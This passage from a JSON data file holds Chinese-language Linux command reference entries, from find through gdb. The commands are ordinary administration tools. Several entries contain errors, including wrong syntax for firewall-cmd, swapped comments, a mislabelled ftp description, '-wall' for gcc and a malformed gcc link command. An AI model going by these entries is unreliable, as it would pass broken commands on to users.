\"./sk\" -prune -o -name \"*.txt\" -print\n```\n\n#### find其他技巧收集  \n\n要列出所有长度为零的文件\n\n```\nfind . -empty\n```\n\n\n\n"},{"name":"findfs","categoryId":0,"data":"findfs\n\u003d\u003d\u003d\n\n标签或UUID查找文件系统\n\n## 补充说明\n\n**findfs命令** 依据卷标（Label）和UUID查找文件系统所对应的设备文件。findfs命令会搜索整个磁盘，看是否有匹配的标签或者UUID没有，如果有则打印到标注输出上。findfs命令也是e2fsprogs项目的一部分。\n\n### 语法  \n\n```\nfindfs(参数)\n```\n\n### 参数  \n\n`LABEL\u003d\u003c卷标\u003e`或者`UUID\u003d\u003cUUID\u003e`：按照卷标或者UUID查询文件系统。\n\n### 实例  \n\n通过卷标名查找对应的文件系统：\n\n```\nfindfs LABEL\u003d/boot\n/dev/hda1\n```\n\n\n"},{"name":"finger","categoryId":2,"data":"finger\n\u003d\u003d\u003d\n\n用于查找并显示用户信息\n\n## 补充说明\n\n**finger命令** 用于查找并显示用户信息。包括本地与远端主机的用户皆可，帐号名称没有大小写的差别。单独执行finger指令，它会显示本地主机现在所有的用户的登陆信息，包括帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话。\n\n### 语法  \n\n```\nfinger(选项)(参数)\n```\n\n### 选项  \n\n```\n-l：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的Shell，登入时间，转信地址，电子邮件状态，还有计划文件和方案文件内容；\n-m：排除查找用户的真实姓名；\n-s：列出该用户的帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话；\n-p：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的Shell，登入时间，转信地址，电子邮件状态，但不显示该用户的计划文件和方案文件内容。\n```\n\n不指定finger的选项如果提供操作者的话，缺省设为`-l`输出风格，否则为`-s`风格，注意在两种格式中，如果信息不足，都有一些域可能丢失，如果没有指定参数finger会为当前登录的每个用户打印一个条目。\n\n### 参数  \n\n用户名：指定要查询信息的用户。\n\n### 实例  \n\n在计算机上使用finger：\n\n```\n[root@localhost root]# finger\nlogin Name Tty Idle Login time Office Office Phone\nroot root tty1 2 Dec 18 13\nroot root pts/0 1 Dec 18 13\nroot root *pts/1 Dec 18 13\n```\n\n如果要查询远程机上的用户信息，需要在用户名后面接`@主机名`，采用`用户名@主机名`的格式，不过要查询的网络主机需要运行finger守护进程的支持。\n\n\n"},{"name":"firewall-cmd","categoryId":0,"data":"firewall-cmd\n\u003d\u003d\u003d\n\nLinux上新用的防火墙软件，跟iptables差不多的工具。\n\n## 补充说明\n\nfirewall-cmd 是 firewalld的字符界面管理工具，firewalld是centos7的一大特性，最大的好处有两个：支持动态更新，不用重启服务；第二个就是加入了防火墙的“zone”概念。\n\nfirewalld跟iptables比起来至少有两大好处：\n\n1. firewalld可以动态修改单条规则，而不需要像iptables那样，在修改了规则后必须得全部刷新才可以生效。\n2. firewalld在使用上要比iptables人性化很多，即使不明白“五张表五条链”而且对TCP/IP协议也不理解也可以实现大部分功能。\n\nfirewalld自身并不具备防火墙的功能，而是和iptables一样需要通过内核的netfilter来实现，也就是说firewalld和 iptables一样，他们的作用都是用于维护规则，而真正使用规则干活的是内核的netfilter，只不过firewalld和iptables的结 构以及使用方法不一样罢了。\n\n\n\n### 语法  \n\n```\nfinger(选项)(参数)\n```\n\n\n### 实例  \n\n```bash\n# 安装firewalld\nyum install firewalld firewall-config\n\n\nsystemctl start  firewalld # 启动\nsystemctl status firewalld # 或者 firewall-cmd --state 查看状态\nsystemctl disable firewalld # 停止\nsystemctl stop firewalld  # 禁用\n\n# 关闭服务的方法\n# 你也可以关闭目前还不熟悉的FirewallD防火墙，而使用iptables，命令如下：\n\nsystemctl stop firewalld\nsystemctl disable firewalld\nyum install iptables-services\nsystemctl start iptables\nsystemctl enable iptables\n```\n\n配置firewalld\n\n```bash\nfirewall-cmd --version  # 查看版本\nfirewall-cmd --help     # 查看帮助\n\n# 查看设置：\nfirewall-cmd --state  # 显示状态\nfirewall-cmd --get-active-zones  # 查看区域信息\nfirewall-cmd --get-zone-of-interface\u003deth0  # 查看指定接口所属区域\nfirewall-cmd --panic-on  # 拒绝所有包\nfirewall-cmd --panic-off  # 取消拒绝状态\nfirewall-cmd --query-panic  # 查看是否拒绝\n\nfirewall-cmd --reload # 更新防火墙规则\nfirewall-cmd --complete-reload\n# 两者的区别就是第一个无需断开连接，就是firewalld特性之一动态添加规则，第二个需要断开连接，类似重启服务\n\n\n# 将接口添加到区域，默认接口都在public\nfirewall-cmd --zone\u003dpublic --add-interface\u003deth0\n# 永久生效再加上 --permanent 然后reload防火墙\n \n# 设置默认接口区域，立即生效无需重启\nfirewall-cmd --set-default-zone\u003dpublic\n\n# 查看所有打开的端口：\nfirewall-cmd --zone\u003ddmz --list-ports\n\n# 加入一个端口到区域：\nfirewall-cmd --zone\u003ddmz --add-port\u003d8080/tcp\n# 若要永久生效方法同上\n \n# 打开一个服务，类似于将端口可视化，服务需要在配置文件中添加，/etc/firewalld 目录下有services文件夹，这个不详细说了，详情参考文档\nfirewall-cmd --zone\u003dwork --add-service\u003dsmtp\n \n# 移除服务\nfirewall-cmd --zone\u003dwork --remove-service\u003dsmtp\n\n# 显示支持的区域列表\nfirewall-cmd --get-zones\n\n# 设置为家庭区域\nfirewall-cmd --set-default-zone\u003dhome\n\n# 查看当前区域\nfirewall-cmd --get-active-zones\n\n# 设置当前区域的接口\nfirewall-cmd --get-zone-of-interface\u003denp03s\n\n# 显示所有公共区域（public）\nfirewall-cmd --zone\u003dpublic --list-all\n\n# 临时修改网络接口（enp0s3）为内部区域（internal）\nfirewall-cmd --zone\u003dinternal --change-interface\u003denp03s\n\n# 永久修改网络接口enp03s为内部区域（internal）\nfirewall-cmd --permanent --zone\u003dinternal --change-interface\u003denp03s\n```\n\n服务管理\n\n```bash\n# 显示服务列表  \nAmanda, FTP, Samba和TFTP等最重要的服务已经被FirewallD提供相应的服务，可以使用如下命令查看：\n\nfirewall-cmd --get-services\n\n# 允许SSH服务通过\nfirewall-cmd --enable service\u003dssh\n\n# 禁止SSH服务通过\nfirewall-cmd --disable service\u003dssh\n\n# 打开TCP的8080端口\nfirewall-cmd --enable ports\u003d8080/tcp\n\n# 临时允许Samba服务通过600秒\nfirewall-cmd --enable service\u003dsamba --timeout\u003d600\n\n# 显示当前服务\nfirewall-cmd --list-services\n\n# 添加HTTP服务到内部区域（internal）\nfirewall-cmd --permanent --zone\u003dinternal --add-service\u003dhttp\nfirewall-cmd --reload     # 在不改变状态的条件下重新加载防火墙\n```\n\n端口管理\n\n```bash\n# 打开443/TCP端口\nfirewall-cmd --add-port\u003d443/tcp\n\n# 永久打开3690/TCP端口\nfirewall-cmd --permanent --add-port\u003d3690/tcp\n\n# 永久打开端口好像需要reload一下，临时打开好像不用，如果用了reload临时打开的端口就失效了\n# 其它服务也可能是这样的，这个没有测试\nfirewall-cmd --reload\n\n# 查看防火墙，添加的端口也可以看到\nfirewall-cmd --list-all\n```\n\n直接模式\n\n```bash\n# FirewallD包括一种直接模式，使用它可以完成一些工作，例如打开TCP协议的9999端口\n\nfirewall-cmd --direct -add-rule ipv4 filter INPUT 0 -p tcp --dport 9000 -j ACCEPT\nfirewall-cmd --reload\n```\n"},{"name":"fmt","categoryId":1,"data":"fmt\n\u003d\u003d\u003d\n\n读取文件后优化处理并输出\n\n## 补充说明\n\n**fmt命令** 读取文件的内容，根据选项的设置对文件格式进行简单的优化处理，并将结果送到标准输出设备。\n\n### 语法  \n\n```\nfmt(选项)(参数)\n```\n\n### 选项  \n\n```\n-c或--crown-margin：每段前两列缩排；\n-p\u003c列起始字符串\u003e或-prefix\u003d\u003c列起始字符串\u003e：仅合并含有指定字符串的列，通常运用在程序语言的注解方面；\n-s或--split-only：只拆开字数超出每列字符数的列，但不合并字数不足每列字符数的列；\n-t或--tagged-paragraph：每列前两列缩排，但第1列和第2列的缩排格式不同；\n-u或--uniform-spacing：每列字符之间都以一个空格字符间隔，每个句子之间则两个空格字符分隔；\n-w\u003c每列字符数\u003e或--width\u003d\u003c每列字符数\u003e或-\u003c每列字符数\u003e：设置每列的最大字符数。\n```\n\n### 参数  \n\n指定要优化格式的文件。\n\n\n"},{"name":"fold","categoryId":1,"data":"fold\n\u003d\u003d\u003d\n\n控制文件内容输出时所占用的屏幕宽度\n\n## 补充说明\n\n**fold命令** 用于控制文件内容输出时所占用的屏幕宽度。fold命令会从指定的文件里读取内容，将超过限定列宽的列加入增列字符后，输出到标准输出设备。若不指定任何文件名称，或是所给予的文件名为“-”，则fold指令会从标准输入设备读取数据。\n\n### 语法  \n\n```\nfold(选项)(参数)\n```\n\n### 选项  \n\n```\n-b或——bytes：以Byte为单位计算列宽，而非采用行数编号为单位；\n-s或——spaces：以空格字符作为换列点；\n-w\u003c每列行数\u003e或--width\u003c每列行数\u003e：设置每列的最大行数。\n```\n\n### 参数  \n\n文件：指定要显示内容的文件。\n\n\n"},{"name":"free","categoryId":2,"data":"free\n\u003d\u003d\u003d\n\n显示内存的使用情况\n\n## 补充说明\n\n**free命令** 可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。\n\n### 语法  \n\n```\nfree(选项)\n```\n\n### 选项  \n\n```bash\n-b # 以Byte为单位显示内存使用情况；\n-k # 以KB为单位显示内存使用情况；\n-m # 以MB为单位显示内存使用情况；\n-g # 以GB为单位显示内存使用情况。 \n-o # 不显示缓冲区调节列；\n-s\u003c间隔秒数\u003e # 持续观察内存使用状况；\n-t # 显示内存总和列；\n-V # 显示版本信息。\n```\n\n### 实例  \n\n```bash\nfree -t    # 以总和的形式显示内存的使用信息\nfree -s 10 # 周期性的查询内存使用信息，每10s 执行一次命令\n```\n\n显示内存使用情况\n\n```bash\nfree -m\n             total       used       free     shared    buffers     cached\nMem:          2016       1973         42          0        163       1497\n-/+ buffers/cache:        312       1703\nSwap:         4094          0       4094\n```\n\n **第一部分Mem行解释：** \n\n```\ntotal：内存总数；\nused：已经使用的内存数；\nfree：空闲的内存数；\nshared：当前已经废弃不用；\nbuffers Buffer：缓存内存数；\ncached Page：缓存内存数。\n```\n\n关系：total \u003d used + free\n\n **第二部分(-/+ buffers/cache)解释:** \n\n```\n(-buffers/cache) used内存数：第一部分Mem行中的 used – buffers – cached\n(+buffers/cache) free内存数: 第一部分Mem行中的 free + buffers + cached\n```\n\n可见-buffers/cache反映的是被程序实实在在吃掉的内存，而+buffers/cache反映的是可以挪用的内存总数。\n\n第三部分是指交换分区。\n\n输出结果的第四行是交换分区SWAP的，也就是我们通常所说的虚拟内存。\n区别：第二行(mem)的used/free与第三行(-/+ buffers/cache) used/free的区别。 这两个的区别在于使用的角度来看，第一行是从OS的角度来看，因为对于OS，buffers/cached 都是属于被使用，所以他的可用内存是2098428KB,已用内存是30841684KB,其中包括，内核（OS）使用+Application(X, oracle,etc)使用的+buffers+cached.\n\n第三行所指的是从应用程序角度来看，对于应用程序来说，buffers/cached 是等于可用的，因为buffer/cached是为了提高文件读取的性能，当应用程序需在用到内存的时候，buffer/cached会很快地被回收。\n\n所以从应用程序的角度来说，可用内存\u003d系统free memory+buffers+cached。\n如本机情况的可用内存为：\n\n18007156\u003d2098428KB+4545340KB+11363424KB\n\n接下来解释什么时候内存会被交换，以及按什么方交换。 \n\n当可用内存少于额定值的时候，就会开会进行交换。如何看额定值：\n\n```bash\ncat /proc/meminfo\n\nMemTotal:       16140816 kB\nMemFree:          816004 kB\nMemAvailable:    2913824 kB\nBuffers:           17912 kB\nCached:          2239076 kB\nSwapCached:            0 kB\nActive:         12774804 kB\nInactive:        1594328 kB\nActive(anon):   12085544 kB\nInactive(anon):    94572 kB\nActive(file):     689260 kB\nInactive(file):  1499756 kB\nUnevictable:      116888 kB\nMlocked:          116888 kB\nSwapTotal:       8191996 kB\nSwapFree:        8191996 kB\nDirty:                56 kB\nWriteback:             0 kB\nAnonPages:      12229228 kB\nMapped:           117136 kB\nShmem:             58736 kB\nSlab:             395568 kB\nSReclaimable:     246700 kB\nSUnreclaim:       148868 kB\nKernelStack:       30496 kB\nPageTables:       165104 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    16262404 kB\nCommitted_AS:   27698600 kB\nVmallocTotal:   34359738367 kB\nVmallocUsed:      311072 kB\nVmallocChunk:   34350899200 kB\nHardwareCorrupted:     0 kB\nAnonHugePages:   3104768 kB\nHugePages_Total:       0\nHugePages_Free:        0\nHugePages_Rsvd:        0\nHugePages_Surp:        0\nHugepagesize:       2048 kB\nDirectMap4k:      225536 kB\nDirectMap2M:    13279232 kB\nDirectMap1G:     5242880 kB\n```\n\n交换将通过三个途径来减少系统中使用的物理页面的个数：　\n \n1. 减少缓冲与页面cache的大小， \n2. 将系统V类型的内存页面交换出去，　 \n3. 换出或者丢弃页面。(Application 占用的内存页，也就是物理内存不足）。 \n\n事实上，少量地使用swap是不是影响到系统性能的。\n\n那buffers和cached都是缓存，两者有什么区别呢？\n\n为了提高磁盘存取效率, Linux做了一些精心的设计, 除了对dentry进行缓存(用于VFS,加速文件路径名到inode的转换), 还采取了两种主要Cache方式：\n\nBuffer Cache和Page Cache。前者针对磁盘块的读写，后者针对文件inode的读写。这些Cache有效缩短了 I/O系统调用(比如read,write,getdents)的时间。\n磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种Cache就是分别缓存逻辑和物理级数据的。\n\nPage cache实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到page cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当page cache的数据需要刷新时，page cache中的数据交给buffer cache，因为Buffer Cache就是缓存磁盘块的。但是这种处理在2.6版本的内核之后就变的很简单了，没有真正意义上的cache操作。\n\nBuffer cache是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到buffer cache中，例如，文件系统的元数据都会缓存到buffer cache中。\n\n简单说来，page cache用来缓存文件数据，buffer cache用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到page cache，如果直接采用dd等工具对磁盘进行读写，那么数据会缓存到buffer cache。\n\n所以我们看linux,只要不用swap的交换空间,就不用担心自己的内存太少.如果常常swap用很多,可能你就要考虑加物理内存了.这也是linux看内存是否够用的标准.\n\n如果是应用服务器的话，一般只看第二行，+buffers/cache,即对应用程序来说free的内存太少了，也是该考虑优化程序或加内存了。\n\n\n\n"},{"name":"fsck","categoryId":3,"data":"fsck\n\u003d\u003d\u003d\n\n检查并且试图修复文件系统中的错误\n\n## 补充说明\n\n**fsck命令** 被用于检查并且试图修复文件系统中的错误。当文件系统发生错误四化，可用fsck指令尝试加以修复。\n\n### 语法  \n\n```\nfsck(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：自动修复文件系统，不询问任何问题；\n-A：依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统；\n-N：不执行指令，仅列出实际执行会进行的动作；\n-P：当搭配\"-A\"参数使用时，则会同时检查所有的文件系统；\n-r：采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式；\n-R：当搭配\"-A\"参数使用时，则会略过/目录的文件系统不予检查；\n-s：依序执行检查作业，而非同时执行；\n-t\u003c文件系统类型\u003e：指定要检查的文件系统类型；\n-T：执行fsck指令时，不显示标题信息；\n-V：显示指令执行过程。\n```\n\n### 参数  \n\n文件系统：指定要查看信息的文件系统。\n\n### 实例  \n\nlinux的文件系统损坏会导致linux不正常关机，出错的时候如果系统告诉你是哪一块硬盘的分区有问题，比如是`/dev/hda2`，接着用如下的命令去对付它：\n\n```\nfsck -y /dev/hda2\n```\n\n结束后使用reboot命令重启系统这样就好了！\n\n如果不知道时哪个地方出了问题，可以直接：\n\n```\nfsck\n```\n\n在随后的多个确认对话框中输入`:y`\n\n结束后同样使用reboot命令重启系统这样就好了！\n\n\n"},{"name":"ftp","categoryId":7,"data":"ftp\n\u003d\u003d\u003d\n\n用来设置文件系统相关功能\n\n## 补充说明\n\n**ftp命令** 用来设置文件系统相关功能。ftp服务器在网上较为常见，Linux ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux ftp命令的一些经常使用的命令，相信掌握了这些使用Linux进行ftp操作将会非常容易。\n\n### 语法  \n\n```\nftp(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：详细显示指令执行过程，便于排错或分析程序执行的情况；\n-i：关闭互动模式，不询问任何问题；\n-g：关闭本地主机文件名称支持特殊字符的扩充特性；\n-n：不使用自动登录；\n-v：显示指令执行过程。\n```\n\n### 参数  \n\n主机：指定要连接的FTP服务器的主机名或ip地址。\n\n### 实例  \n\n```bash\nftp\u003e ascii  # 设定以ASCII方式传送文件(缺省值) \nftp\u003e bell   # 每完成一次文件传送,报警提示. \nftp\u003e binary # 设定以二进制方式传送文件. \nftp\u003e bye    # 终止主机FTP进程,并退出FTP管理方式. \nftp\u003e case   # 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母. \nftp\u003e cd     # 同UNIX的CD命令. \nftp\u003e cdup   # 返回上一级目录. \nftp\u003e chmod  # 改变远端主机的文件权限. \nftp\u003e close  # 终止远端的FTP进程,返回到FTP命令状态, 所有的宏定义都被删除. \nftp\u003e delete # 删除远端主机中的文件. \nftp\u003e dir [remote-directory] [local-file] # 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件. \nftp\u003e get [remote-file] [local-file] # 从远端主机中传送至本地主机中. \nftp\u003e help [command] # 输出命令的解释. \nftp\u003e lcd # 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录. \nftp\u003e ls [remote-directory] [local-file] # 同DIR. \nftp\u003e macdef                 # 定义宏命令. \nftp\u003e mdelete [remote-files] # 删除一批文件. \nftp\u003e mget [remote-files]    # 从远端主机接收一批文件至本地主机. \nftp\u003e mkdir directory-name   # 在远端主机中建立目录. \nftp\u003e mput local-files # 将本地主机中一批文件传送至远端主机. \nftp\u003e open host [port] # 重新建立一个新的连接. \nftp\u003e prompt           # 交互提示模式. \nftp\u003e put local-file [remote-file] # 将本地一个文件传送至远端主机中. \nftp\u003e pwd  # 列出当前远端主机目录. \nftp\u003e quit # 同BYE. \nftp\u003e recv remote-file [local-file] # 同GET. \nftp\u003e rename [from] [to]     # 改变远端主机中的文件名. \nftp\u003e rmdir directory-name   # 删除远端主机中的目录. \nftp\u003e send local-file [remote-file] # 同PUT. \nftp\u003e status   # 显示当前FTP的状态. \nftp\u003e system   # 显示远端主机系统类型. \nftp\u003e user user-name [password] [account] # 重新以别的用户名登录远端主机. \nftp\u003e ? [command] # 同HELP. [command]指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。\nftp\u003e ! # 从 ftp 子系统退出到外壳。\n```\n\n关闭FTP连接\n\n```bash\nbye\nexit\nquit\n```\n\n下载文件\n\n```bash\nftp\u003e get readme.txt # 下载 readme.txt 文件\nftp\u003e mget *.txt     # 下载 \n```\n\n上传文件\n\n```bash\nftp\u003e put /path/readme.txt # 上传 readme.txt 文件\nftp\u003e mput *.txt           # 可以上传多个文件\n```\n\n\n\n"},{"name":"ftpcount","categoryId":7,"data":"ftpcount\n\u003d\u003d\u003d\n\n显示目前已FTP登入的用户人数\n\n## 补充说明\n\n显示目前已ftp登入的用户人数。执行这项指令可得知目前用FTP登入系统的人数以及FTP登入人数的上限。\n\n语法：\n\n```\nftpcount\n```\n\n\n"},{"name":"ftpshut","categoryId":7,"data":"ftpshut\n\u003d\u003d\u003d\n\n在指定的时间关闭FTP服务器\n\n## 补充说明\n\n功能说明：在指定的时间关闭ftp服务器。本指令提供系统管理者在设置的时间关闭FTP服务器，且能在关闭之前发出警告信息通知用户。关闭时间若设置后为\"none\"，则会马上关闭服务器。如果采 用\"+30\"的方式来设置表示服务器在30分钟之后关闭。依次类推，假设使用\"1130\"的格式则代表服务器会在每日的11时30分关闭，时间格式为24 小时制。FTP服务器关闭后，在/etc目录下会产生一个名称为shutmsg的文件，把它删除后即可再度启动FTP服务器的功能。\n\n语法：\n\n```\nftpshut [-d\u003c分钟\u003e][-l\u003c分钟\u003e][关闭时间][\"警告信息\"]\n```\n\n参数：\n\n```\n-d\u003c分钟\u003e   切断所有FTP连线时间。\n-l\u003c分钟\u003e   停止接受FTP登入的时间。\n```\n\n\n"},{"name":"ftptop","categoryId":0,"data":"ftptop\n\u003d\u003d\u003d\n\nproftpd服务器的连接状态\n\n## 补充说明\n\n**ftptop命令** 类似于top命令的显示风格显示proftpd服务器的连接状态。\n\n### 语法  \n\n```\nftptop(选项)\n```\n\n### 选项  \n\n```\n-D：过滤正在下载的会话；\n-S：仅显示指定虚拟主机的连接状态；\n-d：指定屏幕刷新时间，默认\n```\n\n\n"},{"name":"ftpwho","categoryId":7,"data":"ftpwho\n\u003d\u003d\u003d\n\n显示当前每个ftp会话信息\n\n## 补充说明\n\n**ftpwho命令** ftp服务器套件proftpd的工作指令，用于显示当前每个ftp会话信息。\n\n### 语法  \n\n```\nftpwho(选项)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n-v：详细模式，输出更多信息。\n```\n\n\n"},{"name":"fuser","categoryId":0,"data":"fuser\n\u003d\u003d\u003d\n\n使用文件或文件结构识别进程\n\n## 补充说明\n\n**fuser命令** 用于报告进程使用的文件和网络套接字。fuser命令列出了本地进程的进程号，那些本地进程使用file，参数指定的本地或远程文件。对于阻塞特别设备，此命令列出了使用该设备上任何文件的进程。\n\n每个进程号后面都跟随一个字母，该字母指示进程如何使用文件。\n\n*   c：指示进程的工作目录。\n*   e：指示该文件为进程的可执行文件(即进程由该文件拉起)。\n*   f：指示该文件被进程打开，默认情况下f字符不显示。\n*   F：指示该文件被进程打开进行写入，默认情况下F字符不显示。\n*   r：指示该目录为进程的根目录。\n*   m：指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存。\n\n### 语法  \n\n```\nfuser(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：显示命令行中指定的所有文件；\n-k：杀死访问指定文件的所有进程；\n-i：杀死进程前需要用户进行确认；\n-l：列出所有已知信号名；\n-m：指定一个被加载的文件系统或一个被加载的块设备；\n-n：选择不同的名称空间；\n-u：在每个进程后显示所属的用户名。\n```\n\n### 参数  \n\n文件：可以是文件名或者TCP、UDP端口号。\n\n### 实例  \n\n要列出使用`/etc/passwd`文件的本地进程的进程号，请输入：\n\n```\nfuser /etc/passwd\n```\n\n要列出使用`/etc/filesystems`文件的进程的进程号和用户登录名，请输入：\n\n```\nfuser -u /etc/filesystems\n```\n\n要终止使用给定文件系统的所有进程，请输入：\n\n```\nfuser -k -x -u -c /dev/hd1  或者  fuser -kxuc /home\n```\n\n任一命令都列出了进程号和用户名，然后终止每个正在使用`/dev/hd1 (/home)`文件系统的进程。仅有root用户能终止属于另一用户的进程。如果您正在试图卸下`/dev/hd1`文件系统，而一个正在访问`/dev/hd1`文件系统的进程不允许这样，您可能希望使用此命令。\n\n要列出正在使用已从给定文件系统删除的文件的全部进程，请输入：\n\n```\nfuser -d /usr文件\n```\n\n`/dev/kmem` 用于系统映像。  \n`/dev/mem`  也用于系统映像。\n\n\n"},{"name":"gcc","categoryId":0,"data":"gcc\n\u003d\u003d\u003d\n\n基于C/C++的编译器\n\n## 补充说明\n\n**gcc命令** 使用GNU推出的基于C/C++的编译器，是开放源代码领域应用最广泛的编译器，具有功能强大，编译代码支持性能优化等特点。现在很多程序员都应用GCC，怎样才能更好的应用GCC。目前，GCC可以用来编译C/C++、FORTRAN、JAVA、OBJC、ADA等语言的程序，可根据需要选择安装支持的语言。\n\n### 语法  \n\n```\ngcc(选项)(参数)\n```\n\n### 选项  \n\n```\n-o：指定生成的输出文件；\n-E：仅执行编译预处理；\n-S：将C代码转换为汇编代码；\n-wall：显示警告信息；\n-c：仅执行编译操作，不进行连接操作。\n```\n\n### 参数  \n\nC源文件：指定C语言源代码文件。\n\n### 实例  \n\n **常用编译命令选项** \n\n假设源程序文件名为test.c\n\n **无选项编译链接** \n\n```\ngcc test.c\n```\n\n将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。\n\n **选项 -o** \n\n```\ngcc test.c -o test\n```\n\n将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。\n\n **选项 -E** \n\n```\ngcc -E test.c -o test.i\n```\n\n将test.c预处理输出test.i文件。\n\n **选项 -S** \n\n```\ngcc -S test.i\n```\n\n将预处理输出文件test.i汇编成test.s文件。\n\n **选项 -c** \n\n```\ngcc -c test.s\n```\n\n将汇编输出文件test.s编译输出test.o文件。\n\n **无选项链接** \n\n```\ngcc test.o -o test\n```\n\n将编译输出文件test.o链接成最终可执行文件test。\n\n **选项 -O** \n\n```\ngcc -O1 test.c -o test\n```\n\n使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。\n\n **多源文件的编译方法** \n\n如果有多个源文件，基本上有两种编译方法：\n\n假设有两个源文件为test.c和testfun.c\n\n **多个文件一起编译** \n\n```\ngcc testfun.c test.c -o test\n```\n\n将testfun.c和test.c分别编译后链接成test可执行文件。\n\n **分别编译各个源文件，之后对编译后输出的目标文件链接。** \n\n```\ngcc -c testfun.c    #将testfun.c编译成testfun.o\ngcc -c test.c       #将test.c编译成test.o\ngcc -o testfun.o test.o -o test    #将testfun.o和test.o链接成test\n```\n\n以上两种方法相比较，第一中方法编译时需要所有文件重新编译，而第二种方法可以只重新编译修改的文件，未修改的文件不用重新编译。\n\n\n"},{"name":"gcov","categoryId":0,"data":"gcov\n\u003d\u003d\u003d\n\n测试程序的代码覆盖率的工具\n\n## 补充说明\n\n**gcov命令** 是一款测试程序的代码覆盖率的工具。\n\n### 语法  \n\n```\ngcov(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：显示帮助信息；\n-v：显示版本信息；\n-a：输出所有的基本块的执行计数；\n-n：并创建输出文件。\n```\n\n### 参数  \n\nV语言文件：C语言源代码文件。\n\n\n"},{"name":"gdb","categoryId":0,"data":"gdb\n\u003d\u003d\u003d\n\n功能强大的程序调试器\n\n## 补充说明\n\n**gdb命令** 包含在GNU的gcc开发套件中，是功能强大的程序调试器。GDB中的命令固然很多，但我们只需掌握其中十个左右的命令，就大致可以完成日常的基本的程序调试工作。\n\n\u003ctable border\u003d\"0\" cellpadding\u003d\"0\" cellspacing\u003d\"0\"\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e命令\u003c/th\u003e\n\n\u003cth\u003e解释\u003c/th\u003e\n\n\u003cth\u003e示例\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003efile \u003c文件名\u003e\u003c/td\u003e\n\n\u003ctd\u003e加载被调试的可执行程序文件。  \n因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) file gdb-sample\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003er\u003c/td\u003e\n\n\u003ctd\u003eRun的简写，运行被调试的程序。  \n如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) r\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ec\u003c/td\u003e\n\n\u003ctd\u003eContinue的简写，继续执行被调试程序，直至下一个断点或程序结束。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) c\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003eb \u003c行号\u003e  \nb \u003c函数名称\u003e  \nb *\u003c函数名称\u003e  \nb *\u003c代码地址\u003e d [编号]\u003c/td\u003e\n\n\u003ctd\u003eb: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。  \n其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。 d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) b 8  \n(gdb) b main  \n(gdb) b *main  \n(gdb) b *0x804835c (gdb) d\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003es, n\u003c/td\u003e\n\n\u003ctd\u003es: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；  \nn: 执行一行源程序代码，此行代码中的函数调用也一并执行。 s 相当于其它调试器中的“Step Into (单步跟踪进入)”；  \nn 相当于其它调试器中的“Step Over (单步跟踪)”。 这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) s  \n(gdb) n\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003esi, ni\u003c/td\u003e\n\n\u003ctd\u003esi命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) si  \n(gdb) ni\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003ep \u003c变量名称\u003e\u003c/td\u003e\n\n\u003ctd\u003ePrint的简写，显示指定变量（临时变量或全局变量）的值。\u003c/td\u003e\n\n\u003ctd\u003e(gdb) p i  \n(gdb) p nGlobalVar\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003edisplay ... undisplay 